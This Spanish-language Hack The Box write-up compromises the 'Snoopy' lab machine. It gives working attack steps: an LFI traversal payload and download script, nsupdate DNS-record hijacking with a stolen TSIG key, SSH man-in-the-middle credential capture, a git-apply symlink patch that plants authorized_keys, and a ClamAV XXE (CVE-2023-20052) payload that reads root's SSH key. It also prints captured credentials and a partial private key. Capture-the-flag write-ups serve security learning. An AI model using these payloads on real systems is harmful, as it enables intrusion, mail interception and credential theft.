___
Tags: #Hard #Snoopy
___
# Snoopy

## Información General

**- Dificultad:** Hard <br>
**- Sistema operativo:** Linux <br> 
**- Fecha de resolución:** 11/08/2026 <br>
**- Enlace:** [Snoopy](https://app.hackthebox.com/machines/Snoopy) <br>

## Correos/Usuarios identificados

* _info@snoopy.htb_
* _cschultz@snoopy.htb_ 
* _sbrown@snoopy.htb_
* _hangel@snoopy.htb_
* _lpelt@snoopy.htb_
* _cbrown@snoopy.htb_
___

* _cbrown_
* _sbrown_

## Listado de Vulnerabilidades Identificadas

1. **Inclusión Local de Archivos (LFI / Local File Inclusion)**

- **Descripción:** La aplicación web permite la manipulación del parámetro `file` en la ruta `/download` (ej. `/download?file=....//....//....//....//....//....//....//etc/passwd`), evadiendo la restricción mediante una secuencia de escalado de directorios.

- **Impacto:** Permite a un atacante no autenticado leer archivos arbitrarios del sistema de archivos del servidor remoto, como el archivo `/etc/passwd` (revelando nombres de usuarios) o archivos de configuración críticos del sistema como `/etc/bind/named.conf`.

2. **Exposición de Credenciales / Claves Secretas en Archivos de Configuración**

- **Descripción:** La clave simétrica de autenticación `rndc-key` (usada para la gestión y actualización del servicio DNS BIND9) se encuentra almacenada en texto plano dentro de la configuración del servidor (`/etc/bind/named.conf`).

- **Impacto:** Permite que cualquier usuario que logre leer el archivo de configuración obtenga la clave TSIG (`hmac-sha256`), obteniendo privilegios autorizados para realizar actualizaciones dinámicas en el servidor DNS.

3. **Modificación Insegura de Registros DNS mediante Updates Dinámicos (DNS Poisoning / Spoofing)**

- **Descripción:** El servidor BIND9 permite actualizaciones dinámicas de zonas mediante la clave TSIG obtenida.

- **Impacto:** Un atacante puede reenviar solicitudes de resolución DNS cambiando la IP asociada a subdominios críticos (como `mail.snoopy.htb`) hacia una dirección IP controlada por el atacante. Esto facilita la intercepción de correos sensibles, incluyendo tokens para el restablecimiento de contraseñas de usuarios.

 4. **Enumeración de Usuarios mediante Errores de Aplicación (User Enumeration)**

- **Descripción:** Al solicitar la recuperación de clave en la plataforma Mattermost (`mm.snoopy.htb`), el sistema devuelve respuestas distintas para usuarios válidos e inválidos. Para un usuario existente sin servidor de correo funcional, arroja un error interno (`HTTP 500`) indicando explícitamente la falla al enviar el mensaje.

- **Impacto:** Revela a un atacante la existencia de nombres de usuario válidos en el sistema (por ejemplo, `sbrown@snoopy.htb`).

5. **Intercepción y Abuso de Tráfico SSH (SSH Man-In-The-Middle / Credential Sniffing)**

- **Descripción:** Las tareas o procesos automatizados de aprovisionamiento de servidores intentan autenticarse e iniciar sesión de manera constante o desprotegida por SSH.

- **Impacto:** Un atacante puede levantar un servidor proxy falso (utilizando herramientas como `ssh-mitm`) para capturar credenciales de acceso SSH en texto plano (en este caso, las credenciales del usuario `cbrown`).

6. **Inyección de Argumentos / Abuso de Simlinks en Git (`sudo git apply`)**

- **Descripción:** El usuario `cbrown` cuenta con permisos de `sudo` para ejecutar `git apply` como el usuario `sbrown`. Al combinar enlaces simbólicos (`symlinks`) apuntando a directorios protegidos dentro del repositorio de Git, se pueden manipular los cambios del parche.

- **Impacto:** Permite sobrescribir y escribir archivos arbitrarios en el directorio del usuario objetivo (como `/home/sbrown/.ssh/authorized_keys`), logrando un movimiento lateral e iniciando sesión como el usuario `sbrown`.

7. **Inyección de Entidades Externas en XML (XXE) en ClamAV (**CVE-2023-20052**)**

- **Descripción:** La versión instalada del antivirus `ClamAV` (v1.0.0) contiene un fallo en el analizador de archivos `.dmg` de macOS. El análisis de metadatos del archivo en formato XML (tráiler `.plist`) no deshabilita el procesamiento de entidades externas.

- **Impacto:** Dado que el usuario `sbrown` puede ejecutar `sudo /usr/local/bin/clamscan` con privilegios elevados, la explotación del XXE en una imagen `.dmg` manipulada permite leer archivos confidenciales del sistema pertenecientes a `root` (como la clave privada SSH `/root/.ssh/id_rsa`), lo que resulta en un compromiso total del sistema y escalada a privilegios de administrador (`root`).
## Reconocimiento

**HTB** nos proporciona la ip de la máquina objetivo **10.129.229.5**

### Ping

```
ping -c 1 10.10.14.188
```

<p align="center">
<img src="images/ping.png" width="600" alt="Resultado de Nmap">
</p>

**Su ttl es 63. Por tanto, estamos antes un SO Linux**

## Enumeración

### Escaneo de puertos abiertos

#### Escaneo de puerto TCP

El comando que uso con nmap es:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.129.229.5
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ee:6b:ce:c5:b6:e3:fa:1b:97:c0:3d:5f:e3:f1:a1:6e (ECDSA)
|_  256 54:59:41:e1:71:9a:1a:87:9c:1e:99:50:59:bf:e5:ba (ED25519)
53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Open port | Service | Version                           |
| --------- | ------- | --------------------------------- |
| 22        | ssh     | OpenSSH 8.9p1 Ubuntu 3ubuntu0.1   |
| 53        | domain  | ISC BIND 9.18.12-0ubuntu0.22.04.1 |
| 80        | http    | nginx 1.18.0                      |

### Website - TCP 80

<p align="center">
<img src="images/Snoopy-web.png" width="600" alt="Resultado de Nmap">
</p>

Parece ser que el sitio pertenece a un sitio web de ciber.

<p align="center">
<img src="images/correoinfo.png" width="600" alt="Resultado de Nmap">
</p>

_info@snoopy.htb_

En el apartado **team** me encontré los siguientes usuarios.

<p align="center">
<img src="images/teamusers.png" width="600" alt="Resultado de Nmap">
</p>

_cschultz@snoopy.htb_, _sbrown@snoopy.htb_,  _hangel@snoopy.htb_, _lpelt@snoopy.htb_

En la página principal nos encontramos lo siguiente:

<p align="center">
<img src="images/here.png" width="600" alt="Resultado de Nmap">
</p>

El primer **here** (/download) me descarga un **.zip** (press_release) y el segundo **here** (/download?file=announcement.pdf)

La carpeta **press_release** contiene dos archivos:

* PDF: Lo único a destacar es que encontramos el nombre del dominio **snoopy.htb** y un nuevo contacto `pr@snoopy.htb`

<p align="center">
<img src="images/pdf.png" width="600" alt="Resultado de Nmap">
</p>

* mp4: Lo único a destacar es la confirmación del dominio de la página y un nuevo correo electronico.

_sbrown@snoopy.htb_ 

En el apartado **contact** tiene un formulario para enviar preguntas:

<p align="center">
<img src="images/contact.png" width="600" alt="Resultado de Nmap">
</p>

El banner de arriba dice:

> Atención: Debido a la migración de los registros DNS a nuestro nuevo dominio, les informamos que nuestro servidor de correo 'mail.snoopy.htb' se encuentra actualmente fuera de servicio.

En nuestro archivo **hosts** deberíamos ir anotando:

```
10.129.229.5 snoopy.htb mail.snoopy.htb
```

Al enviar el formulario se envía una solicitud POST con los datos, pero la respuesta es simplemente un error:

<p align="center">
<img src="images/error  php.png" width="600" alt="Resultado de Nmap">
</p>

> Error: ¡No se pudo cargar la biblioteca "PHP Email Form"!

Hasta ahora sabemos que las URL de las páginas muestran páginas que terminan en `.html`. Hay una referencia a PHP en el correo electrónico de error, y esa solicitud POST se dirige a `/forms/contact.php`. Parece que el sitio probablemente está construido en PHP, aunque los encabezados de la respuesta lo confirmen

#### Directory Brute Force

```
feroxbuster -u http://10.129.229.5 -x php,html -C 400,502 --no-recursion --dont-extract-links
```

<p align="center">
<img src="images/feroxbuster.png" width="600" alt="Resultado de Nmap">
</p>

Estoy usando `--no-recursion`y `--dont-extract-links`aquí, ya que ambos generan un montón de errores que no son útiles. Nada demasiado interesante aquí. Notaré que `/download`y `/download.php`parecen ser lo mismo.
#### Fuzzing web - vhost

```
ffuf -u http://10.129.229.5 -H "Host: FUZZ.snoopy.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac
```

>mm                      [Status: 200, Size: 3132, Words: 141, Lines: 1, Duration: 113ms]

Estoy usando `-mc all`para mostrar todos los códigos de estado y `-ac`para permitir el filtrado inteligente de la respuesta común. Encuentra uno más, `mm`.

Lo añadiré a mi `/etc/hosts`archivo:

```
10.129.229.5 snoopy.htb mail.snoopy.htb mm.snoopy.htb
```

##### Navegando a mm.snoopy.htb

<p align="center">
<img src="images/loginmm.png" width="600" alt="Resultado de Nmap">
</p>

Si le damos a **forgot you password** nos manda a la siguiente página

<p align="center">
<img src="images/resetpass.png" width="600" alt="Resultado de Nmap">
</p>

Si probamos con un correo existente nos saldrá lo siguiente:

<p align="center">
<img src="images/sbeownrestpass.png" width="600" alt="Resultado de Nmap">
</p>

Pero con un usuario inexistente:

<p align="center">
<img src="images/daresetpass.png" width="600" alt="Resultado de Nmap">
</p>

Por ahora, dejaremos esto anotado.

#### Transferencia de zona a snoopy.htb 

```
dig axfr snoopy.htb @10.129.229.5
```

```bash
snoopy.htb.		86400	IN	SOA	ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.		86400	IN	NS	ns1.snoopy.htb.
snoopy.htb.		86400	IN	NS	ns2.snoopy.htb.
mattermost.snoopy.htb.	86400	IN	A	172.18.0.3
mm.snoopy.htb.		86400	IN	A	127.0.0.1
ns1.snoopy.htb.		86400	IN	A	10.0.50.10
ns2.snoopy.htb.		86400	IN	A	10.0.51.10
postgres.snoopy.htb.	86400	IN	A	172.18.0.2
provisions.snoopy.htb.	86400	IN	A	172.18.0.4
www.snoopy.htb.		86400	IN	A	127.0.0.1
snoopy.htb.		86400	IN	SOA	ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
```

Las distintas direcciones IP 172.18.0.0/8 sugieren que quizás se trate de contenedores.

Voy a esperar un poco `hosts`antes de incluirlos en mi archivo. `mm`Sé que devuelve algo diferente, así que ese sí vale la pena. También veo que `mail.snoopy.htb`no está ahí, lo cual coincide con los errores observados anteriormente. Tendré en cuenta los demás también.

## Explotación

### Shell como cbrown

#### LFI

En la siguiente url `/download?file=announcement.pdf` se descubre un **LFI** pero se explota de la siguiente manera `/download?file=....//....//....//....//....//....//....//etc/passwd`

<p align="center">
<img src="images/request.png" width="600" alt="Resultado de Nmap">
</p>

Luego en el **Response** obtenemos lo siguiente:

<p align="center">
<img src="images/response.png" width="600" alt="Resultado de Nmap">
</p>

Si le damos en el request botón derecho a **open response in browser** nos dara un link, ese link lo copiamos en el navegador y nos descargara un archivo **.zip**

<p align="center">
<img src="images/linkdescarga.png" width="600" alt="Resultado de Nmap">
</p>

Al descomprimir el **.zip** nos mostrará el contenido del archivo **passwd**

<p align="center">
<img src="images/passwd.png" width="600" alt="Resultado de Nmap">
</p>

#### Enumeración de usuarios

Para enumerar el host, encontré un script rápido en Python que me permitirá descargar archivos fácilmente y descomprimirlos.

```python
#!/usr/bin/env python3

import requests
import sys
import zipfile
from io import BytesIO

if len(sys.argv) < 2:
    print(f"usage: {sys.argv[0]} [full path of file]")
    sys.exit()

fpath = sys.argv[1]
outfile = sys.argv[2] if len(sys.argv) > 2 else None

resp = requests.get(f'http://snoopy.htb/download?file=....//....//....//....//....//{fpath}')

if len(resp.content) == 0:
    print(f"File not found: {fpath}")
    sys.exit()

with zipfile.ZipFile(BytesIO(resp.content)) as zip_file:
    file_path_in_zip = zip_file.namelist()[0]
    with zip_file.open(file_path_in_zip) as file:
        contents = file.read()

if outfile:
    with open(outfile, 'wb') as f:
        f.write(contents)
    print(f"Results written to {outfile}")
else:
    print(contents.decode())
```

Guardamos el script con el siguiente nombre: **lfi.py** y le damos permiso de ejecución `chmod +x lfi.py` El script funcionaría de la siguiente forma:

```
python3 lfi.py /etc/passwd
```

<p align="center">
<img src="images/lfypython.png" width="600" alt="Resultado de Nmap">
</p>

Según el `passwd` archivo, la caja tiene seis usuarios con shells configurados:

```
root:x:0:0:root:/root:/bin/bash
cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
lpelt:x:1003:1004::/home/lpelt:/bin/bash
cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
```

#### Acceso a Mattermost

Volviendo a interceptar `mm.snoopy.htb` con burpsuite, cuando se intentas pedir un restablecimiento de clave para un usuario objetivo (_sbrown@snoopy.htb_), la aplicación web responde inmediatamente con un **`HTTP 500 Internal Server Error`**.

Al analizar la respuesta JSON de ese error 500:

<p align="center">
<img src="images/responseclave.png" width="600" alt="Resultado de Nmap">
</p>

```
{"id": "api.user.send_password_reset.send.app_error", 
"message": "Failed to send password reset email successfully."}
```

La aplicación te dice explícitamente: _"Sé qué usuario es, generé la acción, pero **fallé al intentar enviar el correo** por red."_ y luego en el apartado **contacto** se comenta que que el dominio **mail.snoopy.htb** está fuera de servicio

<p align="center">
<img src="images/fueraservicio.png" width="600" alt="Resultado de Nmap">
</p>

Por tanto, el objetivo es redirigir el envío del cambio de contraseña a nuestra IP. Eso se consigue obteniendo **la Clave TSIG de Bind9** mediante **LFI**

>La clave **TSIG** (_Transaction SIGnature_) en BIND9 es una clave secreta simétrica que se utiliza para **autenticar y garantizar la integridad** de las comunicaciones DNS entre clientes y el servidor. Gracias a esta clave lograremos cambiar la contraseña de correo existente.

```
python3 lfi.py /etc/bind/named.conf
```

```bash
include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
```

Guardo la **rndc-key** en un **.txt** como **rndc-key.txt**

En otro **.txt** Guardado la secuencias de estos comandos

```
server 10.129.229.5
zone snoopy.htb
update add mail.snoopy.htb 86400 IN A 10.10.14.188
send
```

Lo guardamos como **dns_trucado.txt**, Por último completaremos el ataque con la herramienta **nsupdate**

>`nsupdate` permite añadir, modificar o borrar registros de dominio (como registros `A` o `MX`) al instante desde la red, utilizando claves de autenticación como **TSIG** para validar que los cambios provienen de un administrador autorizado.

##### Secuencia de la explotación

```
nsupdate -k rndc-key.txt dns_trucado.txt 
```

Con el siguiente comando visualizaremos si se hizo correctamente la modificación.

```
dig mail.snoopy.htb +noall +answer @10.129.229.5
```

>mail.snoopy.htb.	86400	IN	A	10.10.14.188

**IMPORTANTE** La siguiente acción (que es básicamente el cambio de contraseña de un correo existente), lo tendremos que realizar muy rápido ya que la modificación es temporal. 

Tendremos que preparar el puerto de escucha para ello nos levantaremos un **entorno virtual**

```
sudo python3 -m venv venv
source venv/bin/activate
```

Y dentro del entorno descárganos lo siguiente:

```
sudo apt update && sudo apt install python3-aiosmtpd
pip install aiosmtpd
```

<p align="center">
<img src="images/avisoo.png" width="600" alt="Resultado de Nmap">
</p>

Aunque salga este aviso el siguiente comando ya funcionará

```
sudo python3 -m aiosmtpd -n -l 0.0.0.0:25
```

Navegaremos a esta pagina `http://mm.snoopy.htb/reset_password` e intentamos obtener el token de la url para el cambio de la contraseña del correo. 

Se capturará un chorro de información pero nos centraremos donde dice **Reset password**

>Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3D7qs3z=
e48p3r16bb79jmc63mmggdzz6am6bez4shet5uheu7oicwakefe8cwmqddp )

El siguiente token tendremos que **limpiarlo**, eso nos ayudará la IA

```bash
http://mm.snoopy.htb/reset_password_complete?token=7qs3ze48p3r16bb79jmc63mmggdzz6am6bez4shet5uheu7oicwakefe8cwmqddp
```

Ingresamos el cambio de contraseña y conseguimos cambiarlo exitosamente

<p align="center">
<img src="images/passupdatesuccess.png" width="600" alt="Resultado de Nmap">
</p>

**usuario**: _sbrown@snoopy.htb_
**pass**: hack123

#### SSH 

##### Enumeración de Mattermost

Ya estoy en dos canales. El canal Fuera de tema está vacío. Hay dos cosas importantes sucediendo en la Plaza del Pueblo. Primero, hay mensajes sobre el aprovisionamiento del servidor:

```
cbrown. Hola a todos, acabo de crear un nuevo canal dedicado a enviar solicitudes de aprovisionamiento de nuevos servidores a medida que comenzamos a implementar nuestra nueva herramienta DevSecOps.

sbrown. ¡Eso es genial, Charlie! Realmente necesitábamos un canal dedicado para esto.

Ipelt. Sí, ahora podemos hacer un seguimiento de todas las solicitudes de servidores y asegurarnos de que se procesen rápidamente
```

<p align="center">
<img src="images/1cnversacion.png" width="600" alt="Resultado de Nmap">
</p>

Y luego, más tarde, cbrown vuelve a hablar de ello:

```
cbrown. Bien, chicos, mientras trabajamos para poner todo en marcha, asegúrense de que el host para el que solicitan el aprovisionamiento ya funcione con nuestro IPA. De lo contrario, no podré iniciar sesión. ¡Gracias de antemano!
```

<p align="center">
<img src="images/conversacion2.png" width="600" alt="Resultado de Nmap">
</p>

Entre medias, hay una conversación sobre antivirus:

```
pjean. Hablando de seguridad, ¿hemos hablado de proteger los nuevos servidores con algún tipo de protección de endpoints? ¿Tal vez ClamAV?

cbrown. Ese es un gran punto, Peggy. Definitivamente deberíamos investigar eso.

Vvgray. No estoy familiarizado con ClamAV, ¿qué es?

cbrown. Es un software antivirus de código abierto que puede detectar y eliminar varios tipos de malware. Actualmente lo estamos usando para algunos de nuestros servidores.

Vvgray. Me alegra que nos estemos tomando la seguridad en serio. Siempre es mejor prevenir que lamentar.

cschultz. Así es, Violet. Con las nuevas herramientas que estamos empezando a implementar y el uso de ClamAV, estamos dando un gran paso hacia un lugar de trabajo más seguro y eficiente
```

<p align="center">
<img src="images/conversacion3.png" width="600" alt="Resultado de Nmap">
</p>

ClamAV es un antivirus para Linux y se ejecuta en sus servidores. Esto será útil más adelante.

Finalmente, sbrown está trabajando en un nuevo módulo y necesita la ayuda de cbrown:

```
sbrown. ¡Gracias!
Por cierto, Charlie. Estoy intentando trabajar en un nuevo módulo y tengo problemas. Necesito tu ayuda, pero hablaré contigo en persona para ponerte al día.

cbrown. No te preocupes. ¡Hablamos pronto!
```

<p align="center">
<img src="images/converssacion4.png" width="600" alt="Resultado de Nmap">
</p>

Si escribo una `/` en la conversación de Town Square (activaremos la sesión de comandos) y buscamos **server_provision** con eso lograremos establecer una ssh

<p align="center">
<img src="images/server provisioning.png" width="600" alt="Resultado de Nmap">
</p>

Pero la conexión es muy corta, y se corta :(

##### sshmitm

> es un framework escrito en Python diseñado para interceptar conexiones SSH actuando como un _Man-In-The-Middle_ (hombre en el medio). Permite capturar las credenciales (usuario y contraseña) enviadas por el cliente SSH de la víctima en texto plano.

Estableceremos esta nueva herramienta en un **Entorno virtual**

Se corrige los permisos de la carpeta del entorno virtual asignándoselos de nuevo a mi usuario `dani`

```
sudo chown -R dani:dani /home/dani/Escritorio/MACHINES/hard/snoopy/venv
```

Ahora intentaremos instalar **sshmith**

```
/home/dani/Escritorio/MACHINES/hard/snoopy/venv/bin/pip install ssh-mitm
```

Con el siguiente comando nos centraremos en encontrar la contraseña del usuario **cbrown**

```
python3 -m sshmitm server --enable-trivial-auth --listen-port 2222
```

<p align="center">
<img src="images/ssh-mith.png" width="600" alt="Resultado de Nmap">
</p>

Credenciales --> **cbrown**: `sn00pedcr3dential!!!`

Usaremos el siguiente para establecer el **ssh** para el usuario **cbrown**

```
sshpass -p 'sn00pedcr3dential!!!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null cbrown@10.129.229.5
```

`-o StrictHostKeyChecking=no`. Por defecto, cuando te conectas por SSH a un servidor, tu cliente compara la clave pública (huella digital) del servidor con la que tiene guardada.

- Como acabas de realizar un ataque Man-In-The-Middle y redirigir el tráfico hacia tu propio servidor falso, la huella digital SSH del destino cambió en tu equipo.
    
- Al añadir `StrictHostKeyChecking=no`, le ordenas al cliente SSH: _"No verifiques si la clave pública del servidor es conocida o cambió; conéctate de todos modos sin pedirme confirmación interactiva `(yes/no)`"_.

`-o UserKnownHostsFile=/dev/null`. Normalmente, SSH guarda o consulta las huellas digitales en el archivo local `~/.ssh/known_hosts`.

- Si la huella digital guardada anteriormente difiere de la actual, SSH aborta la conexión con un error de seguridad del tipo `WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!`.
    
- Al redirigir el archivo de claves a `/dev/null` (el dispositivo nulo de Linux que descarta todo), le dices a SSH que ignore cualquier clave guardada previamente en tu sistema y empiece la sesión desde cero.

<p align="center">
<img src="images/cbrown.png" width="600" alt="Resultado de Nmap">
</p>

### Movimiento lateral a sbrown

```
sudo -l
```

<p align="center">
<img src="images/sudol.png" width="600" alt="Resultado de Nmap">
</p>

La expresión regular no permite espacios ni los caracteres necesarios para simular un espacio en Bash, por lo que debe utilizarse un único argumento para aplicarla

#### POC

Antes de empezar a trabajar con `git` , necesito configurar algunas variables globales para evitar que `git` me regañe.

```
git config --global user.name "cbrown"
git config --global user.email "cbrown@snoopy.htb"
git config --global init.defaultBranch main
```

Ahora, crearé un directorio en `/dev/shm` y lo convertiré en un repositorio de Git.

```
mkdir /dev/shm/poc
cd /dev/shm/poc
git init
```

> Initialized empty Git repository in /dev/shm/poc/.git/

Para probar, intentaré crear un archivo en un directorio que poseo (sin usar `sudo` ) para facilitar la resolución de problemas. Crearé `/home/cbrown/dani` . Primero, necesito crear un enlace simbólico que apunte al directorio de destino y añadirlo al repositorio:

```
ln -s /home/cbrown/ symlink
git add symlink
git commit -m "add symlink"
```

Crearé el archivo " `patch` ", utilizando los datos del test, y lo modificaré ligeramente.

```
diff --git a/symlink b/renamed-symlink
similarity index 100%
rename from symlink
rename to renamed-symlink
--
diff --git /dev/null b/renamed-symlink/0xdf
new file mode 100644
index 0000000..039727e
--- /dev/null
+++ b/renamed-symlink/dani
@@ -0,0 +1,1 @@
+busted
```

El único cambio es de `create-me` a `dani` en dos lugares. `git apply patch` lo ejecutará, y el nuevo archivo existe.

```
git apply patch
cat ~/dani
```

>busted

Esto demuestra que aunque no tengamos permisos para escribir en un archivo, mediante git, si que podemos hacerlo, como el poc ya esta comprobado. A continuación llevamos acabo la explotación de verdad.

#### Sobrescribir las claves autorizadas

Con `sudo` , puedo realizar esta explotación como "sbrown". La primera cosa que intentaré es sobrescribir su archivo `authorized_keys` . Comenzaré con un nuevo repositorio, esta vez añadiendo un enlace simbólico que apunta a la carpeta `.ssh` de "sbrown":

En **/dev/shm** creamos una carpeta **ssh** y accedemos a esa carpeta.

```
mkdir ssh && cd ssh
git init
ln -s /home/sbrown/.ssh symlink
git add symlink
git commit -m "add symlink"
```

>[main (root-commit) 4f69273] add symlink
 1 file changed, 1 insertion(+)
 create mode 120000 symlink

Crearé un archivo llamado `patch` , esta vez modificando `dani` a `authorized_keys` , y `busted` a una clave pública SSH.

```bash
diff --git a/symlink b/renamed-symlink
similarity index 100%
rename from symlink
rename to renamed-symlink
--
diff --git /dev/null b/renamed-symlink/authorized_keys
new file mode 100644
index 0000000..039727e
--- /dev/null
+++ b/renamed-symlink/authorized_keys
@@ -0,0 +1,1 @@
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQSfxB5i60MGG2C6EOdp00jHqyfn2eg7Kk8qETgkN8LfhaesFCyqhVxi6AYE60GxegcPd1XAOGzzO/9z47tDJuFxNH20x9ZuWJ6++NcZ642rZZ7nBXbQsrMugNZhXaGS7S/Pxc/+lkICCgdjPsbODaUS8LaHGNHLw66GtcElIXDqTIiSeUZgOQgpmzFTAggTevMHOL9543YlN1ucsfHylYoMmXNu9gJl8GbyyeLVHFAUSWSJG0J0iTGHoI+u3WNa/A9DSmHPv888l9Io6B+Nc8mlloGDXAQOMDHWdhRh3EbGg1j1VblGJ2WlmDK+a7cXxskfMGkHzgs8dOuLQ2hUET6mDm1NGwCwQHKR75nGNXfE4AF/2RWKiWKcxawCLLdfo5SwxhCQSCsNIvinGxMTUzZwjnPWk5E9qbUuItGOZoDe6tQYnJ9ZGs+AKb8llJlH1/FzTayguldQ+ujorddwFwuruS15tsppnZySLe78xMbyrZzrIPhGqn1MmKTVtqN70= cbrown@snoopy.htb
```

Antes de ejecutar tenemos que darle todos los permisos a la carpeta ssh `chmod 777 ssh` sino nos saltará con un error de permisos.

```
sudo -u sbrown git apply -v patch
```

>Checking patch symlink => renamed-symlink...
Checking patch renamed-symlink/authorized_keys...
Applied patch symlink => renamed-symlink cleanly.
Applied patch renamed-symlink/authorized_keys cleanly.

```
ssh -i ~/keys/ed25519_gen sbrown@snoopy.htb
```

<p align="center">
<img src="images/sbrown.png" width="600" alt="Resultado de Nmap">
</p>

## Escalada de Privilegios

### Shell as root  Shell como administrador

#### Enumeration

```
sudo -l
```

> `(root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$`

>clamscan es la herramienta de línea de comandos del motor antivirus de código abierto **ClamAV** (desarrollado por Cisco).

>Su función principal es analizar archivos, directorios o imágenes de disco en busca de malware, troyanos, virus y otras amenazas en sistemas Linux y Unix.

```
clamscan --version
```

Esta versión en particular (**ClamAV 1.0.0**) es exactamente la versión **vulnerable a la falla CVE-2023-20052**.

**La vulnerabilidad:** ClamAV 1.0.0 y anteriores contienen un fallo de inyección de entidades externas en XML (**XXE**) en su analizador de archivos `.dmg` (imágenes de disco de macOS).

> ClamAV 1.0.0/26853/Fri Mar 24 07:24:11 2023

#### Exploit CVE-2023-20052 

Se descargará el siguiente repo para llevar acabo la explotación

```
git clone https://github.com/nokn0wthing/CVE-2023-20052.git
```

El **DockerFile** del repositorio tendrá una ligera modificación, a continuación le dejó como tiene que quedar:

```
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y ca-certificates gnupg wget

# Configuración del repositorio archivado ignorando la validación de firmas expiradas
RUN echo "deb [trusted=yes] http://archive.debian.org/debian-security stretch/updates main" >> /etc/apt/sources.list
RUN echo 'Acquire::Check-Valid-Until "false";' > /etc/apt/apt.conf.d/99no-check-valid-until
RUN echo 'APT::Get::AllowUnauthenticated "true";' >> /etc/apt/apt.conf.d/99no-check-valid-until

# Actualizar e instalar dependencias omitiendo verificación GPG
RUN apt-get update -o Acquire::AllowInsecureRepositories=true -y
RUN apt-get install -y --allow-unauthenticated libssl1.0-dev gcc g++ cmake zlib1g-dev genisoimage bbe git

RUN git clone https://github.com/planetbeing/libdmg-hfsplus.git
WORKDIR /libdmg-hfsplus
RUN cmake .
RUN make
RUN cp dmg/dmg /bin
WORKDIR /exploit

CMD ["/bin/bash"]
```

Luego escribimos el siguiente comando:

```
docker build -t cve-2023-20052 .
```

<p align="center">
<img src="images/cve202320052.png" width="600" alt="Resultado de Nmap">
</p>

Con el siguiente comando lograremos compartir archivos entre tu equipo y el contenedor, además de iniciar el contenedor:

```
docker run -it -v $(pwd):/exploit cve-2023-20052
```

```
genisoimage -D -V "exploit" -no-pad -r -apple -file-mode 0777 -o test.img .
```

- **¿Qué hace?**: Crea una imagen de disco HFS/ISO básica denominada `test.img` a partir del contenido de la carpeta actual.
- **Detalle clave:** Utiliza la extensión `-apple` para emular el formato de archivos nativo de macOS.

<p align="center">
<img src="images/testimg.png" width="600" alt="Resultado de Nmap">
</p>

```
dmg dmg test.img test.dmg
```

- **¿Qué hace?** Convierte la imagen de disco plana (`test.img`) al formato `.dmg` comprimido de Apple (`test.dmg`).
- **Detalle clave:** Los archivos `.dmg` incluyen al final un tráiler con metadatos estructurados en formato XML (un archivo `.plist`).

<p align="center">
<img src="images/testdmg.png" width="600" alt="Resultado de Nmap">
</p>

```
bbe -e 's|<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">|<!DOCTYPE plist [<!ENTITY xxe SYSTEM "/root/.ssh/id_rsa"> ]>|' -e 's/blkx/&xxe\;/' test.dmg -o exploit.dmg
```

- **¿Qué hace?** Se utilizara `bbe` (el editor binario) para modificar en el XXE, cambiando el comando de GitHub para leer la clave SSH de root en lugar de `/etc/passwd`

<p align="center">
<img src="images/bbe.png" width="600" alt="Resultado de Nmap">
</p>

Se saldrá del contenedor y, dado que estaba trabajando desde el directorio mapeado, `exploit.dmg`está disponible. Se trasladará este archivo a mi  maquina víctima 

```
python3 -m http.server 80
```

En nuestra máquina victima con el usuario **sbrown** dentro de **/tmp**

```
wget http://10.10.14.188/exploit.dmg 
```

Luego este mismo archivo se traslada a **/home/sbrown/scanfiles/**

```
mv exploit.dmg /home/sbrown/scanfiles/
```

Luego lo ejecutamos

```
sudo clamscan --debug /home/sbrown/scanfiles/exploit.dmg
```

Se conseguirá el **id_rsa** del usuario root

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA1560zU3j7mFQUs5XDGIarth/iMUF6W2ogsW0KPFN8MffExz2G9D/
4gpYjIcyauPHSrV4fjNGM46AizDTQIoK6MyN4K8PNzYMaVnB6IMG9AVthEu11nYzoqHmBf
hy0cp4EaM3gITa10AMBAbnv2bQyWhVZaQlSQ5HDHt0Dw1mWBue5eaxeuqW3RYJGjKjuFSw
kfWsSVrLTh5vf0gaV1ql59Wc8Gh7IKFrEEcLXLqqyDoprKq2ZG06S2foeUWkSY134Uz9oI
